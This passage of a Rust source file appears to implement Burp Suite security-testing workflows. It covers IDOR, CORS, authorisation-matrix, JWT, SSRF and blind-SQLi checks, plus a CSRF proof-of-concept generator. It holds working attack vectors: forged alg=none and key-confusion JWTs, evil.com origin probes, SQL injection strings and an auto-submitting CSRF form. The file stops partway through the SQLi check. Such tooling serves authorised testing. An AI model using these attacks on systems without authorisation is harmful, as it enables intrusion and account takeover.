use crate::diff_engine;
use burp_protocol::BurpClient;
use burp_protocol::protocol::{HttpHeaderEntry, SendRequestRequest, SendRequestResponse};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use url::Url;

const MAX_URL_BYTES: usize = 8 * 1024;
const MAX_HEADER_COUNT: usize = 128;
const MAX_HEADER_BYTES: usize = 16 * 1024;
const MAX_CORS_ORIGINS: usize = 16;
const MAX_AUTH_ENDPOINTS: usize = 32;
const MAX_AUTH_ROLES: usize = 16;
const MAX_AUTH_MATRIX_REQUESTS: usize = 128;
const MAX_SSRF_INJECTION_POINTS: usize = 32;
const MAX_SSRF_WAIT_SECONDS: u64 = 30;
const MAX_SQLI_SLEEP_SECONDS: u64 = 10;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, schemars::JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum ParameterLocation {
    Query,
    Body,
}

impl ParameterLocation {
    fn resolve(value: Option<Self>) -> Self {
        value.unwrap_or(Self::Query)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct HttpResponseParts<'a> {
    headers: Vec<(&'a str, &'a str)>,
    body: &'a str,
}

fn validate_http_url(value: &str, field: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > MAX_URL_BYTES {
        return Err(format!(
            "{field} must contain between 1 and {MAX_URL_BYTES} bytes"
        ));
    }
    let url = Url::parse(value)
        .map_err(|error| format!("{field} must be an absolute HTTP(S) URL: {error}"))?;
    if !matches!(url.scheme(), "http" | "https") || url.host_str().is_none() {
        return Err(format!(
            "{field} must be an absolute HTTP(S) URL with a host"
        ));
    }
    Ok(())
}

fn normalize_method(method: Option<String>, default: &str) -> Result<String, String> {
    let method = method
        .unwrap_or_else(|| default.to_owned())
        .trim()
        .to_ascii_uppercase();
    if method.is_empty()
        || method.len() > 32
        || !method.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(
                    byte,
                    b'!' | b'#'
                        | b'$'
                        | b'%'
                        | b'&'
                        | b'\''
                        | b'*'
                        | b'+'
                        | b'-'
                        | b'.'
                        | b'^'
                        | b'_'
                        | b'`'
                        | b'|'
                        | b'~'
                )
        })
    {
        return Err("method must be a valid HTTP token of at most 32 bytes".to_owned());
    }
    Ok(method)
}

fn validate_name(value: &str, field: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > 256
        || !value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(
                    byte,
                    b'!' | b'#'
                        | b'$'
                        | b'%'
                        | b'&'
                        | b'\''
                        | b'*'
                        | b'+'
                        | b'-'
                        | b'.'
                        | b'^'
                        | b'_'
                        | b'`'
                        | b'|'
                        | b'~'
                )
        })
    {
        return Err(format!(
            "{field} must be a non-empty HTTP token of at most 256 bytes"
        ));
    }
    Ok(())
}

fn validate_headers(headers: &HashMap<String, String>) -> Result<(), String> {
    if headers.len() > MAX_HEADER_COUNT {
        return Err(format!(
            "headers must contain at most {MAX_HEADER_COUNT} entries"
        ));
    }
    for (name, value) in headers {
        validate_name(name, "header name")?;
        if value.len() > MAX_HEADER_BYTES || value.contains(['\r', '\n']) {
            return Err(format!(
                "header `{name}` must contain at most {MAX_HEADER_BYTES} bytes and no CR/LF"
            ));
        }
    }
    Ok(())
}

fn proto_headers(headers: &HashMap<String, String>) -> Vec<HttpHeaderEntry> {
    headers
        .iter()
        .map(|(name, value)| HttpHeaderEntry {
            name: name.clone(),
            value: value.clone(),
        })
        .collect()
}

fn require_response(
    response: SendRequestResponse,
    context: &str,
) -> Result<SendRequestResponse, String> {
    if response.has_response {
        Ok(response)
    } else {
        Err(format!(
            "{context}: Burp completed the request without an HTTP response"
        ))
    }
}

fn split_http_response(raw: &str) -> HttpResponseParts<'_> {
    let (head, body) = raw
        .split_once("\r\n\r\n")
        .or_else(|| raw.split_once("\n\n"))
        .unwrap_or(("", raw));
    let headers = if head.is_empty() {
        Vec::new()
    } else {
        head.lines()
            .skip_while(|line| line.starts_with("HTTP/"))
            .filter_map(|line| line.split_once(':'))
            .map(|(name, value)| (name.trim(), value.trim()))
            .collect()
    };
    HttpResponseParts { headers, body }
}

fn header_values<'a>(
    parts: &'a HttpResponseParts<'a>,
    name: &str,
) -> impl Iterator<Item = &'a str> {
    parts
        .headers
        .iter()
        .filter(move |(candidate, _)| candidate.eq_ignore_ascii_case(name))
        .map(|(_, value)| *value)
}

fn body_contains(response: &SendRequestResponse, pattern: &str) -> bool {
    let text = String::from_utf8_lossy(&response.response);
    split_http_response(&text).body.contains(pattern)
}

fn is_success(status: u32) -> bool {
    (200..300).contains(&status)
}

fn classify_idor(
    baseline: &SendRequestResponse,
    candidate: &SendRequestResponse,
    pattern: Option<&str>,
    similarity: f64,
) -> (bool, bool, &'static str) {
    let both_successful = is_success(baseline.status) && is_success(candidate.status);
    let pattern_matched =
        both_successful && pattern.is_some_and(|value| body_contains(candidate, value));
    let vulnerable = both_successful && (similarity > 0.85 || pattern_matched);
    let verdict = if vulnerable {
        "POTENTIAL_IDOR_CONFIRMED: both authorization contexts received successful matching resource responses"
    } else if matches!(candidate.status, 401 | 403) {
        "PROTECTED: victim request returned access denied"
    } else {
        "INCONCLUSIVE_OR_DIFFERENT: responses did not provide decisive IDOR evidence"
    };
    (vulnerable, pattern_matched, verdict)
}

fn cors_headers(raw: &str) -> (Option<String>, Option<String>) {
    let parts = split_http_response(raw);
    let origin = header_values(&parts, "access-control-allow-origin")
        .next()
        .map(str::to_owned);
    let credentials = header_values(&parts, "access-control-allow-credentials")
        .next()
        .map(str::to_owned);
    (origin, credentials)
}

fn correlated_interaction_count<'a>(
    payloads: &HashSet<&str>,
    interaction_payloads: impl IntoIterator<Item = &'a str>,
) -> usize {
    interaction_payloads
        .into_iter()
        .filter(|payload| payloads.contains(*payload))
        .count()
}

fn append_query_parameter(url: &str, name: &str, value: &str) -> Result<String, String> {
    validate_name(name, "parameter name")?;
    let mut parsed = Url::parse(url).map_err(|error| format!("invalid URL: {error}"))?;
    parsed.query_pairs_mut().append_pair(name, value);
    Ok(parsed.into())
}

fn form_body(name: &str, value: &str) -> Result<Vec<u8>, String> {
    validate_name(name, "parameter name")?;
    Ok(url::form_urlencoded::Serializer::new(String::new())
        .append_pair(name, value)
        .finish()
        .into_bytes())
}

fn parameterized_request(
    method: &str,
    url: &str,
    name: &str,
    value: &str,
    location: ParameterLocation,
) -> Result<SendRequestRequest, String> {
    match location {
        ParameterLocation::Query => Ok(SendRequestRequest {
            method: method.to_owned(),
            url: append_query_parameter(url, name, value)?,
            body: Vec::new(),
            headers: Vec::new(),
        }),
        ParameterLocation::Body => Ok(SendRequestRequest {
            method: method.to_owned(),
            url: url.to_owned(),
            body: form_body(name, value)?,
            headers: vec![HttpHeaderEntry {
                name: "Content-Type".to_owned(),
                value: "application/x-www-form-urlencoded".to_owned(),
            }],
        }),
    }
}

fn graphql_json(raw: &str) -> Option<serde_json::Value> {
    let parts = split_http_response(raw);
    serde_json::from_str(parts.body.trim()).ok()
}

fn graphql_has_introspection(value: &serde_json::Value) -> bool {
    value
        .pointer("/data/__schema/types")
        .is_some_and(serde_json::Value::is_array)
}

fn graphql_has_suggestions(value: &serde_json::Value) -> bool {
    value
        .get("errors")
        .and_then(serde_json::Value::as_array)
        .is_some_and(|errors| {
            errors.iter().any(|error| {
                error
                    .get("message")
                    .and_then(serde_json::Value::as_str)
                    .is_some_and(|message| message.contains("Did you mean"))
                    || error
                        .get("suggestions")
                        .and_then(serde_json::Value::as_array)
                        .is_some_and(|items| !items.is_empty())
                    || error
                        .pointer("/extensions/suggestions")
                        .and_then(serde_json::Value::as_array)
                        .is_some_and(|items| !items.is_empty())
            })
        })
}

fn graphql_batch_supported(value: &serde_json::Value) -> bool {
    value.as_array().is_some_and(|items| {
        items.len() == 3
            && items.iter().all(|item| {
                item.pointer("/data/__typename")
                    .and_then(serde_json::Value::as_str)
                    .is_some()
            })
    })
}

fn cookie_samesite(raw: &str, cookie_name: &str) -> Option<String> {
    let parts = split_http_response(raw);
    header_values(&parts, "set-cookie")
        .filter_map(|header| {
            let mut attributes = header.split(';').map(str::trim);
            let cookie = attributes.next()?;
            let (name, _) = cookie.split_once('=')?;
            if !name.trim().eq_ignore_ascii_case(cookie_name) {
                return None;
            }
            Some(
                attributes
                    .find_map(|attribute| {
                        let (name, value) = attribute.split_once('=')?;
                        name.trim()
                            .eq_ignore_ascii_case("samesite")
                            .then(|| value.trim().to_owned())
                    })
                    .unwrap_or_else(|| "Unset".to_owned()),
            )
        })
        .next()
}

fn csrf_is_vulnerable(status: u32, same_site: &str) -> bool {
    is_success(status)
        && (same_site.eq_ignore_ascii_case("none") || same_site.eq_ignore_ascii_case("unset"))
}

fn csrf_poc(url: &str, method: &str, body: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
  <h3>Cross-Site Request Forgery PoC</h3>
  <form action="{}" method="{}" enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="payload" value="{}" />
    <input type="submit" value="Submit Request" />
  </form>
</body>
</html>"#,
        html_escape::encode_double_quoted_attribute(url),
        html_escape::encode_double_quoted_attribute(method),
        html_escape::encode_double_quoted_attribute(body),
    )
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifyIdorInput {
    pub url: String,
    pub method: Option<String>,
    pub body: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub original_auth_header: String,
    pub victim_auth_header: String,
    pub auth_header_name: Option<String>,
    pub match_pattern: Option<String>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifyIdorOutput {
    pub vulnerable: bool,
    pub verdict: String,
    pub user_a_status: Option<u32>,
    pub user_b_status: Option<u32>,
    pub similarity_score: f64,
    pub pattern_matched_in_victim: bool,
    pub header_diffs: Vec<diff_engine::HeaderDiffEntry>,
    pub response_diff_summary: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct CheckCorsInput {
    pub url: String,
    pub method: Option<String>,
    pub test_origins: Option<Vec<String>>,
    pub headers: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CorsFinding {
    pub origin: String,
    pub allowed_origin: Option<String>,
    pub allow_credentials: Option<String>,
    pub vulnerable: bool,
    pub severity: String,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CheckCorsOutput {
    pub url: String,
    pub findings: Vec<CorsFinding>,
    pub overall_vulnerable: bool,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuthMatrixInput {
    pub endpoints: Vec<String>,
    pub method: Option<String>,
    pub body: Option<String>,
    pub roles: HashMap<String, HashMap<String, String>>, // role_name -> headers
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuthMatrixCell {
    pub endpoint: String,
    pub role: String,
    pub status: Option<u32>,
    pub length: usize,
    pub accessible: bool,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuthMatrixOutput {
    pub matrix: Vec<AuthMatrixCell>,
    pub potential_access_control_violations: Vec<String>,
}

pub async fn run_verify_idor(
    client: &BurpClient,
    input: VerifyIdorInput,
) -> Result<VerifyIdorOutput, String> {
    validate_http_url(&input.url, "url")?;
    let method = normalize_method(input.method, "GET")?;
    let auth_header = input
        .auth_header_name
        .unwrap_or_else(|| "Authorization".to_owned());
    validate_name(&auth_header, "auth_header_name")?;
    if input.original_auth_header.is_empty() || input.victim_auth_header.is_empty() {
        return Err("original_auth_header and victim_auth_header must not be empty".to_owned());
    }
    if input
        .match_pattern
        .as_ref()
        .is_some_and(|pattern| pattern.is_empty() || pattern.len() > 4096)
    {
        return Err("match_pattern must contain between 1 and 4096 bytes".to_owned());
    }
    let base_headers = input.headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    let body = input.body.unwrap_or_default().into_bytes();

    let mut headers_a = base_headers.clone();
    headers_a.insert(auth_header.clone(), input.original_auth_header);
    let resp_a = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: input.url.clone(),
            body: body.clone(),
            headers: proto_headers(&headers_a),
        })
        .await
        .map_err(|error| format!("User A request failed: {error}"))?;
    let resp_a = require_response(resp_a, "User A request failed")?;

    let mut headers_b = base_headers;
    headers_b.insert(auth_header, input.victim_auth_header);
    let resp_b = client
        .send_request(SendRequestRequest {
            method,
            url: input.url,
            body,
            headers: proto_headers(&headers_b),
        })
        .await
        .map_err(|error| format!("User B request failed: {error}"))?;
    let resp_b = require_response(resp_b, "User B request failed")?;

    let text_a = String::from_utf8_lossy(&resp_a.response);
    let text_b = String::from_utf8_lossy(&resp_b.response);
    let diff = diff_engine::compare_http_messages(&text_a, &text_b);
    let (vulnerable, pattern_matched, verdict) = classify_idor(
        &resp_a,
        &resp_b,
        input.match_pattern.as_deref(),
        diff.similarity_score,
    );

    Ok(VerifyIdorOutput {
        vulnerable,
        verdict: verdict.to_owned(),
        user_a_status: Some(resp_a.status),
        user_b_status: Some(resp_b.status),
        similarity_score: diff.similarity_score,
        pattern_matched_in_victim: pattern_matched,
        header_diffs: diff.headers_diff,
        response_diff_summary: diff
            .body_diff
            .lines()
            .take(20)
            .collect::<Vec<_>>()
            .join("\n"),
    })
}

pub async fn run_check_cors(
    client: &BurpClient,
    input: CheckCorsInput,
) -> Result<CheckCorsOutput, String> {
    validate_http_url(&input.url, "url")?;
    let method = normalize_method(input.method, "GET")?;
    let origins = input.test_origins.unwrap_or_else(|| {
        vec![
            "https://evil.com".to_owned(),
            "null".to_owned(),
            "https://target.com.evil.com".to_owned(),
        ]
    });
    if origins.is_empty() || origins.len() > MAX_CORS_ORIGINS {
        return Err(format!(
            "test_origins must contain between 1 and {MAX_CORS_ORIGINS} entries"
        ));
    }
    let base_headers = input.headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    let mut findings = Vec::with_capacity(origins.len());
    let mut overall_vulnerable = false;

    for origin in origins {
        if origin.is_empty() || origin.len() > MAX_URL_BYTES || origin.contains(['\r', '\n']) {
            return Err(
                "each test origin must be non-empty, bounded, and contain no CR/LF".to_owned(),
            );
        }
        let mut headers = base_headers.clone();
        headers.insert("Origin".to_owned(), origin.clone());
        let response = client
            .send_request(SendRequestRequest {
                method: method.clone(),
                url: input.url.clone(),
                body: Vec::new(),
                headers: proto_headers(&headers),
            })
            .await
            .map_err(|error| format!("CORS probe for `{origin}` failed: {error}"))?;
        let response = require_response(response, &format!("CORS probe for `{origin}` failed"))?;
        let text = String::from_utf8_lossy(&response.response);
        let (acao, acac) = cors_headers(&text);
        let credentials = acac
            .as_deref()
            .is_some_and(|value| value.eq_ignore_ascii_case("true"));

        let (vulnerable, severity, description) = match acao.as_deref() {
            Some("*") if credentials => (
                true,
                "HIGH",
                "Wildcard origin is combined with credential support.",
            ),
            Some("*") => (
                true,
                "LOW",
                "Wildcard origin permits cross-origin reads of public responses.",
            ),
            Some(allowed) if allowed.eq_ignore_ascii_case(&origin) && credentials => (
                true,
                "CRITICAL",
                "The supplied untrusted origin is reflected with credentials enabled.",
            ),
            Some(allowed) if allowed.eq_ignore_ascii_case(&origin) => (
                true,
                "MEDIUM",
                "The supplied untrusted origin is reflected.",
            ),
            _ => (false, "INFO", "Origin was rejected or restricted."),
        };
        overall_vulnerable |= vulnerable && severity != "LOW";
        findings.push(CorsFinding {
            origin,
            allowed_origin: acao,
            allow_credentials: acac,
            vulnerable,
            severity: severity.to_owned(),
            description: description.to_owned(),
        });
    }

    Ok(CheckCorsOutput {
        url: input.url,
        findings,
        overall_vulnerable,
    })
}

pub async fn run_auth_matrix(
    client: &BurpClient,
    input: AuthMatrixInput,
) -> Result<AuthMatrixOutput, String> {
    if input.endpoints.is_empty() || input.endpoints.len() > MAX_AUTH_ENDPOINTS {
        return Err(format!(
            "endpoints must contain between 1 and {MAX_AUTH_ENDPOINTS} entries"
        ));
    }
    if input.roles.is_empty() || input.roles.len() > MAX_AUTH_ROLES {
        return Err(format!(
            "roles must contain between 1 and {MAX_AUTH_ROLES} entries"
        ));
    }
    let request_count = input
        .endpoints
        .len()
        .checked_mul(input.roles.len())
        .ok_or_else(|| "auth matrix request count overflowed".to_owned())?;
    if request_count > MAX_AUTH_MATRIX_REQUESTS {
        return Err(format!(
            "endpoint × role combinations must not exceed {MAX_AUTH_MATRIX_REQUESTS}"
        ));
    }
    for endpoint in &input.endpoints {
        validate_http_url(endpoint, "endpoint")?;
    }
    for (role, headers) in &input.roles {
        if role.trim().is_empty() || role.len() > 128 {
            return Err("role names must contain between 1 and 128 bytes".to_owned());
        }
        validate_headers(headers)?;
    }
    let method = normalize_method(input.method, "GET")?;
    let body = input.body.unwrap_or_default().into_bytes();
    let mut matrix = Vec::with_capacity(request_count);
    let mut violations = Vec::new();

    for endpoint in &input.endpoints {
        for (role_name, role_headers) in &input.roles {
            let response = client
                .send_request(SendRequestRequest {
                    method: method.clone(),
                    url: endpoint.clone(),
                    body: body.clone(),
                    headers: proto_headers(role_headers),
                })
                .await
                .map_err(|error| {
                    format!(
                        "auth matrix request for role `{role_name}` at `{endpoint}` failed: {error}"
                    )
                })?;
            let response = require_response(
                response,
                &format!("auth matrix request for role `{role_name}` at `{endpoint}` failed"),
            )?;
            let accessible = response.status < 400;
            if accessible
                && ["anonymous", "guest", "unauthenticated"]
                    .iter()
                    .any(|candidate| role_name.eq_ignore_ascii_case(candidate))
            {
                violations.push(format!(
                    "Endpoint `{endpoint}` is accessible by unauthenticated role `{role_name}` (HTTP {})",
                    response.status
                ));
            }
            matrix.push(AuthMatrixCell {
                endpoint: endpoint.clone(),
                role: role_name.clone(),
                status: Some(response.status),
                length: response.response.len(),
                accessible,
            });
        }
    }

    Ok(AuthMatrixOutput {
        matrix,
        potential_access_control_violations: violations,
    })
}

// =========================================================================
// 4. burp_audit_jwt (JSON Web Token Security Audit)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuditJwtInput {
    pub url: String,
    pub method: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub jwt_token: String,
    pub auth_header_name: Option<String>,
    pub public_key_pem: Option<String>,
    pub tamper_claims: Option<HashMap<String, serde_json::Value>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct JwtTestResult {
    pub vector: String,
    pub modified_jwt: String,
    pub status: Option<u32>,
    pub length: usize,
    pub bypass_detected: bool,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuditJwtOutput {
    pub original_jwt: String,
    pub results: Vec<JwtTestResult>,
    pub vulnerable: bool,
    pub summary: String,
}

struct JwtProbeContext<'a> {
    client: &'a BurpClient,
    url: &'a str,
    method: &'a str,
    base_headers: &'a HashMap<String, String>,
    auth_header: &'a str,
}

pub async fn run_audit_jwt(
    client: &BurpClient,
    input: AuditJwtInput,
) -> Result<AuditJwtOutput, String> {
    use base64::Engine;
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    validate_http_url(&input.url, "url")?;
    let method = normalize_method(input.method, "GET")?;
    let auth_header = input
        .auth_header_name
        .unwrap_or_else(|| "Authorization".to_owned());
    validate_name(&auth_header, "auth_header_name")?;
    let base_headers = input.headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    if input.jwt_token.len() > 64 * 1024 {
        return Err("jwt_token must not exceed 65536 bytes".to_owned());
    }
    let token_parts = input.jwt_token.split('.').collect::<Vec<_>>();
    if token_parts.len() != 3 || token_parts.iter().any(|part| part.is_empty()) {
        return Err("invalid JWT format: expected exactly three non-empty segments".to_owned());
    }
    let header_bytes = URL_SAFE_NO_PAD
        .decode(token_parts[0])
        .map_err(|error| format!("invalid JWT header base64: {error}"))?;
    let payload_bytes = URL_SAFE_NO_PAD
        .decode(token_parts[1])
        .map_err(|error| format!("invalid JWT payload base64: {error}"))?;
    let mut header_json: serde_json::Value = serde_json::from_slice(&header_bytes)
        .map_err(|error| format!("invalid JWT header JSON: {error}"))?;
    let mut payload_json: serde_json::Value = serde_json::from_slice(&payload_bytes)
        .map_err(|error| format!("invalid JWT payload JSON: {error}"))?;
    if !header_json.is_object() || !payload_json.is_object() {
        return Err("JWT header and payload must both be JSON objects".to_owned());
    }

    let probe = JwtProbeContext {
        client,
        url: &input.url,
        method: &method,
        base_headers: &base_headers,
        auth_header: &auth_header,
    };
    let mut results = Vec::new();
    header_json["alg"] = serde_json::json!("none");
    let none_header = URL_SAFE_NO_PAD.encode(
        serde_json::to_vec(&header_json)
            .map_err(|error| format!("failed to encode JWT header: {error}"))?,
    );
    let none_jwt = format!("{none_header}.{}.", token_parts[1]);
    results.push(
        jwt_probe_result(
            &probe,
            "alg_none",
            none_jwt,
            "Checked whether the server accepts an unsigned token with alg=none",
        )
        .await?,
    );

    if let Some(public_key) = input.public_key_pem.as_ref() {
        if public_key.len() > 1024 * 1024 {
            return Err("public_key_pem must not exceed 1048576 bytes".to_owned());
        }
        header_json["alg"] = serde_json::json!("HS256");
        let confused_header = URL_SAFE_NO_PAD.encode(
            serde_json::to_vec(&header_json)
                .map_err(|error| format!("failed to encode JWT header: {error}"))?,
        );
        let signing_input = format!("{confused_header}.{}", token_parts[1]);
        let mut mac = Hmac::<Sha256>::new_from_slice(public_key.as_bytes())
            .map_err(|error| format!("invalid public key material for HS256 probe: {error}"))?;
        mac.update(signing_input.as_bytes());
        let signature = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());
        results.push(
            jwt_probe_result(
                &probe,
                "algorithm_confusion_hs256",
                format!("{signing_input}.{signature}"),
                "Checked whether the server accepts HS256 signed with supplied public key bytes",
            )
            .await?,
        );
    }

    if let Some(tamper) = input.tamper_claims.as_ref() {
        if tamper.is_empty() || tamper.len() > 128 {
            return Err("tamper_claims must contain between 1 and 128 entries".to_owned());
        }
        let payload = payload_json
            .as_object_mut()
            .ok_or_else(|| "JWT payload must be a JSON object".to_owned())?;
        for (name, value) in tamper {
            payload.insert(name.clone(), value.clone());
        }
        let tampered_payload = URL_SAFE_NO_PAD.encode(
            serde_json::to_vec(&payload_json)
                .map_err(|error| format!("failed to encode JWT payload: {error}"))?,
        );
        results.push(
            jwt_probe_result(
                &probe,
                "tampered_claims_invalid_signature",
                format!("{}.{tampered_payload}.{}", token_parts[0], token_parts[2]),
                "Checked whether the server accepts modified claims with the original signature",
            )
            .await?,
        );
    }

    let vulnerable = results.iter().any(|result| result.bypass_detected);
    let summary = if vulnerable {
        "VULNERABILITY DETECTED: server accepted at least one malicious JWT test vector"
    } else {
        "No tested malicious JWT vector received a successful HTTP response"
    };
    Ok(AuditJwtOutput {
        original_jwt: input.jwt_token,
        results,
        vulnerable,
        summary: summary.to_owned(),
    })
}

async fn jwt_probe_result(
    context: &JwtProbeContext<'_>,
    vector: &str,
    token: String,
    description: &str,
) -> Result<JwtTestResult, String> {
    let mut headers = context.base_headers.clone();
    headers.insert(
        context.auth_header.to_owned(),
        if context.auth_header.eq_ignore_ascii_case("authorization") {
            format!("Bearer {token}")
        } else {
            token.clone()
        },
    );
    let response = context
        .client
        .send_request(SendRequestRequest {
            method: context.method.to_owned(),
            url: context.url.to_owned(),
            body: Vec::new(),
            headers: proto_headers(&headers),
        })
        .await
        .map_err(|error| format!("JWT `{vector}` probe failed: {error}"))?;
    let response = require_response(response, &format!("JWT `{vector}` probe failed"))?;
    Ok(JwtTestResult {
        vector: vector.to_owned(),
        modified_jwt: token,
        status: Some(response.status),
        length: response.response.len(),
        bypass_detected: is_success(response.status),
        description: description.to_owned(),
    })
}

// =========================================================================
// 5. burp_verify_ssrf (Server-Side Request Forgery with Collaborator)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifySsrfInput {
    pub target_url: String,
    pub method: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub body: Option<String>,
    pub injection_points: Vec<String>,
    pub wait_seconds: Option<u64>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifySsrfOutput {
    pub target_url: String,
    pub payloads_sent: Vec<String>,
    pub interactions_detected: usize,
    pub vulnerable: bool,
    pub verdict: String,
}

pub async fn run_verify_ssrf(
    client: &BurpClient,
    input: VerifySsrfInput,
) -> Result<VerifySsrfOutput, String> {
    use burp_protocol::protocol::{
        GenerateCollaboratorPayloadsRequest, PageRequest, PollCollaboratorInteractionsRequest,
    };

    validate_http_url(&input.target_url, "target_url")?;
    let method = normalize_method(input.method, "GET")?;
    let base_headers = input.headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    if input.injection_points.is_empty() || input.injection_points.len() > MAX_SSRF_INJECTION_POINTS
    {
        return Err(format!(
            "injection_points must contain between 1 and {MAX_SSRF_INJECTION_POINTS} entries"
        ));
    }
    let wait = input.wait_seconds.unwrap_or(4);
    if wait > MAX_SSRF_WAIT_SECONDS {
        return Err(format!(
            "wait_seconds must not exceed {MAX_SSRF_WAIT_SECONDS}"
        ));
    }
    let payloads = client
        .generate_collaborator_payloads(GenerateCollaboratorPayloadsRequest {
            count: input.injection_points.len() as u32,
            target_url: input.target_url.clone(),
            injection_point: "ssrf_workflow".to_owned(),
        })
        .await
        .map_err(|error| format!("failed to generate Collaborator payloads: {error}"))?
        .payloads;
    if payloads.len() != input.injection_points.len() {
        return Err(format!(
            "Collaborator generated {} payloads for {} injection points",
            payloads.len(),
            input.injection_points.len()
        ));
    }

    for (index, point) in input.injection_points.iter().enumerate() {
        let payload_url = format!("http://{}", payloads[index]);
        let mut headers = base_headers.clone();
        let mut target = input.target_url.clone();
        let mut body = input.body.clone().unwrap_or_default();
        if let Some(name) = point.strip_prefix("header:") {
            validate_name(name, "SSRF header injection name")?;
            headers.insert(name.to_owned(), payload_url);
        } else if let Some(name) = point.strip_prefix("param:") {
            target = append_query_parameter(&target, name, &payload_url)?;
        } else if point == "body" || !point.contains(':') {
            if body.contains("{{ssrf}}") {
                body = body.replacen("{{ssrf}}", &payload_url, 1);
            } else {
                let name = if point == "body" {
                    "url"
                } else {
                    point.as_str()
                };
                body = String::from_utf8(form_body(name, &payload_url)?)
                    .map_err(|error| format!("failed to build SSRF form body: {error}"))?;
                headers
                    .entry("Content-Type".to_owned())
                    .or_insert_with(|| "application/x-www-form-urlencoded".to_owned());
            }
        } else {
            return Err(format!(
                "unsupported injection point `{point}`; use header:NAME, param:NAME, body, or a bare body parameter name"
            ));
        }
        let response = client
            .send_request(SendRequestRequest {
                method: method.clone(),
                url: target,
                body: body.into_bytes(),
                headers: proto_headers(&headers),
            })
            .await
            .map_err(|error| format!("SSRF probe `{point}` failed: {error}"))?;
        require_response(response, &format!("SSRF probe `{point}` failed"))?;
    }

    tokio::time::sleep(tokio::time::Duration::from_secs(wait)).await;
    let poll = client
        .poll_collaborator_interactions(PollCollaboratorInteractionsRequest {
            page: Some(PageRequest {
                limit: 100,
                cursor: String::new(),
            }),
        })
        .await
        .map_err(|error| format!("failed to poll Collaborator interactions: {error}"))?;
    let generated = payloads.iter().map(String::as_str).collect::<HashSet<_>>();
    let interactions_count = correlated_interaction_count(
        &generated,
        poll.items
            .iter()
            .map(|interaction| interaction.payload.as_str()),
    );
    let vulnerable = interactions_count > 0;
    let verdict = if vulnerable {
        format!(
            "CONFIRMED SSRF: received {interactions_count} interaction(s) correlated to this workflow's payloads"
        )
    } else {
        "NO CORRELATED SSRF INTERACTION: no callback for this workflow's payloads arrived within the wait window".to_owned()
    };
    Ok(VerifySsrfOutput {
        target_url: input.target_url,
        payloads_sent: payloads,
        interactions_detected: interactions_count,
        vulnerable,
        verdict,
    })
}

// =========================================================================
// 6. burp_verify_sqli_blind (Differential & Timing SQLi Verification)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifySqliBlindInput {
    pub url: String,
    pub method: Option<String>,
    pub param_name: String,
    pub param_type: Option<ParameterLocation>,
    pub sleep_seconds: Option<u64>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifySqliBlindOutput {
    pub url: String,
    pub boolean_diff_score: f64,
    pub base_latency_ms: u128,
    pub sleep_latency_ms: u128,
    pub vulnerable: bool,
    pub technique: String,
    pub verdict: String,
}

pub async fn run_verify_sqli_blind(
    client: &BurpClient,
    input: VerifySqliBlindInput,
) -> Result<VerifySqliBlindOutput, String> {
    validate_http_url(&input.url, "url")?;
    validate_name(&input.param_name, "param_name")?;
    let method = normalize_method(input.method, "GET")?;
    let location = ParameterLocation::resolve(input.param_type);
    let sleep_sec = input.sleep_seconds.unwrap_or(4);
    if sleep_sec == 0 || sleep_sec > MAX_SQLI_SLEEP_SECONDS {
        return Err(format!(
            "sleep_seconds must be between 1 and {MAX_SQLI_SLEEP_SECONDS}"
        ));
    }

    let start_base = std::time::Instant::now();
    let base = client
        .send_request(parameterized_request(
            &method,
            &input.url,
            &input.param_name,
            "1",
            location,
        )?)
        .await
        .map_err(|error| format!("baseline SQLi probe failed: {error}"))?;
    require_response(base, "baseline SQLi probe failed")?;
    let base_latency = start_base.elapsed().as_millis();

    let true_response = client
        .send_request(parameterized_request(
            &method,
            &input.url,
            &input.param_name,
            "1' AND 1=1-- -",
            location,
        )?)
        .await
        .map_err(|error| format!("boolean-true SQLi probe failed: {error}"))?;
    let true_response = require_response(true_response, "boolean-true SQLi probe failed")?;
    let false_response = client
        .send_request(parameterized_request(
            &method,
            &input.url,
            &input.param_name,
            "1' AND 1=2-- -",
            location,
        )?)
        .await
        .map_err(|error| format!("boolean-false SQLi probe failed: {error}"))?;
    let false_response = require_response(false_response, "boolean-false SQLi probe failed")?;
    let true_text = String::from_utf8_lossy(&true_response.response);
    let false_text = String::from_utf8_lossy(&false_response.response);
